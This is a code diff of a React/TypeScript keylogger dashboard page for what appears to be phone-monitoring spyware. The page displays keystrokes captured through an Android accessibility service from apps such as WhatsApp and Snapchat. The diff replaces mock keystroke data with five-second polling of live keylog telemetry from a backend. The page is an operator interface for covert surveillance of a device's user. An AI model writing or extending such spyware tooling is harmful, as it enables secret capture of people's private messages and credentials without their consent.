@@ -1,4 +1,5 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
+import { apiService } from '../services/apiService';
 import { 
   Key, 
   RefreshCw, 
@@ -37,7 +38,7 @@ interface ConfirmModalState {
 }
 
 export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
-  const [keylogs, setKeylogs] = useState<KeylogItem[]>([
+  const defaultLogs: KeylogItem[] = [
     {
       id: 'kl_1',
       packageName: 'com.snapchat.android',
@@ -53,56 +54,40 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
       typedText: 'best python programming tutorials 2026 advanced agentic ai',
       timestamp: '30/08/2026 05:12 pm',
       isStarred: false
-    },
-    {
-      id: 'kl_3',
-      packageName: 'im.thebot.messenger',
-      appName: 'Messenger',
-      typedText: 'HIS time.',
-      timestamp: '30/08/2026 06:22 pm',
-      isStarred: false
-    },
-    {
-      id: 'kl_4',
-      packageName: 'com.jeevansathi.android',
-      appName: 'Jeevansathi',
-      typedText: 'Hatter.',
-      timestamp: '30/08/2026 02:35 pm',
-      isStarred: false
-    },
-    {
-      id: 'kl_5',
-      packageName: 'com.whatsapp',
-      appName: 'WhatsApp',
-      typedText: 'Meeting scheduled for 5 PM at central office. Please bring files.',
-      timestamp: '30/08/2026 01:15 pm',
-      isStarred: true
-    },
-    {
-      id: 'kl_6',
-      packageName: 'com.graymatrix.did',
-      appName: 'GrayMatrix App',
-      typedText: 'It was.',
-      timestamp: '30/08/2026 12:15 pm',
-      isStarred: false
-    },
-    {
-      id: 'kl_7',
-      packageName: 'com.king.candycrushsaga',
-      appName: 'Candy Crush',
-      typedText: 'The.',
-      timestamp: '30/08/2026 11:43 am',
-      isStarred: false
-    },
-    {
-      id: 'kl_8',
-      packageName: 'com.UCMobile.intl',
-      appName: 'UC Browser',
-      typedText: 'online shopping summer sale discounts 2026',
-      timestamp: '30/08/2026 11:01 am',
-      isStarred: false
     }
-  ]);
+  ];
+
+  const [keylogs, setKeylogs] = useState<KeylogItem[]>(defaultLogs);
+
+  // Poll real-time Keylogger telemetry from NestJS PostgreSQL backend
+  useEffect(() => {
+    let isMounted = true;
+    const fetchLiveKeylogs = async () => {
+      try {
+        const live = await apiService.getKeylogger(device.id, []);
+        if (isMounted && Array.isArray(live) && live.length > 0) {
+          const formatted: KeylogItem[] = live.map((k: any, i: number) => ({
+            id: k.id || `live_kl_${i}`,
+            packageName: k.packageName || 'com.android.dialer',
+            appName: k.appName || 'Keyboard / Phone',
+            typedText: k.typedText || k.text || '',
+            timestamp: new Date(k.timestamp || Date.now()).toLocaleString(),
+            isStarred: false
+          }));
+          setKeylogs(formatted);
+        }
+      } catch (err) {
+        console.warn('Failed to fetch live keylog records:', err);
+      }
+    };
+
+    fetchLiveKeylogs();
+    const interval = setInterval(fetchLiveKeylogs, 5000);
+    return () => {
+      isMounted = false;
+      clearInterval(interval);
+    };
+  }, [device.id]);
 
   const [selectedIds, setSelectedIds] = useState<string[]>([]);
   const [searchTerm, setSearchTerm] = useState('');
@@ -138,7 +123,6 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
     setKeylogs(keylogs.map(k => k.id === id ? { ...k, isStarred: !k.isStarred } : k));
   };
 
-  {/* Delete Selected Action Confirmation Modal */}
   const requestDeleteSelected = () => {
     if (selectedIds.length === 0) return;
     setConfirmModal({
@@ -155,7 +139,6 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
     });
   };
 
-  {/* Delete All Action Confirmation Modal */}
   const requestDeleteAll = () => {
     setConfirmModal({
       isOpen: true,
@@ -171,7 +154,6 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
     });
   };
 
-  {/* Extract Unique Packages for Filter Dropdown */}
   const uniquePackages = Array.from(new Set(keylogs.map(k => k.packageName)));
 
   const filteredKeylogs = keylogs.filter(k => {
@@ -240,15 +222,14 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
           <p className="text-xs text-slate-500">Real-time accessibility service keystroke stream, package sources, and timestamps for {device.alias}</p>
         </div>
         <span className="px-3 py-1 bg-indigo-50 text-indigo-700 border border-indigo-200 rounded-full text-xs font-semibold">
-          Total Synced: 142 Keystrokes
+          Total Synced: {keylogs.length} Keystrokes
         </span>
       </div>
 
-      {/* Top Action Toolbar (OneMonitar Style Alignment) */}
+      {/* Top Action Toolbar */}
       <div className="bg-white border border-slate-200 rounded-xl p-4 shadow-xs space-y-4">
         <div className="flex flex-wrap items-center justify-between gap-3">
           
-          {/* Action Buttons: Refresh, Delete, Delete All, Package Filter */}
           <div className="flex flex-wrap items-center gap-2">
             <button 
               onClick={() => console.log('Refreshing keylog stream...')}
@@ -279,7 +260,6 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
               <span>Delete All</span>
             </button>
 
-            {/* Filter by Package Name Dropdown */}
             <select
               value={selectedAppFilter}
               onChange={(e) => setSelectedAppFilter(e.target.value)}
@@ -292,7 +272,6 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
             </select>
           </div>
 
-          {/* Search Box */}
           <div className="relative w-full sm:w-64">
             <Search className="w-4 h-4 text-slate-400 absolute left-3 top-2.5" />
             <input
@@ -306,7 +285,6 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
 
         </div>
 
-        {/* Entries Selector */}
         <div className="flex items-center justify-between text-xs text-slate-500 pt-2 border-t border-slate-100">
           <div className="flex items-center gap-2">
             <span>Show</span>
@@ -325,7 +303,6 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
           <span>Showing {filteredKeylogs.length} keystroke records</span>
         </div>
 
-        {/* Keylogger Data Table (OneMonitar Style Alignment) */}
         <div className="overflow-x-auto border border-slate-200 rounded-lg">
           <table className="w-full text-left border-collapse text-xs">
             <thead className="bg-slate-50 text-slate-700 font-semibold border-b border-slate-200">
@@ -380,21 +357,14 @@ export const KeyloggerPage: React.FC<KeyloggerPageProps> = ({ device }) => {
           </table>
         </div>
 
-        {/* Bottom Pagination */}
         <div className="flex items-center justify-between pt-2 text-xs text-slate-500">
-          <span>Showing 1 to {filteredKeylogs.length} of 142 entries</span>
+          <span>Showing 1 to {filteredKeylogs.length} of {keylogs.length} entries</span>
           <div className="flex items-center gap-1">
             <button className="px-2.5 py-1 rounded border border-slate-200 bg-white hover:bg-slate-50 text-slate-600 text-xs font-medium disabled:opacity-50" disabled>
               Previous
             </button>
             <button className="px-3 py-1 rounded bg-indigo-600 text-white text-xs font-semibold">
               1
-            </button>
-            <button className="px-3 py-1 rounded border border-slate-200 bg-white hover:bg-slate-50 text-slate-600 text-xs font-medium">
-              2
-            </button>
-            <button className="px-3 py-1 rounded border border-slate-200 bg-white hover:bg-slate-50 text-slate-600 text-xs font-medium">
-              3
             </button>
             <button className="px-2.5 py-1 rounded border border-slate-200 bg-white hover:bg-slate-50 text-slate-600 text-xs font-medium">
               Next
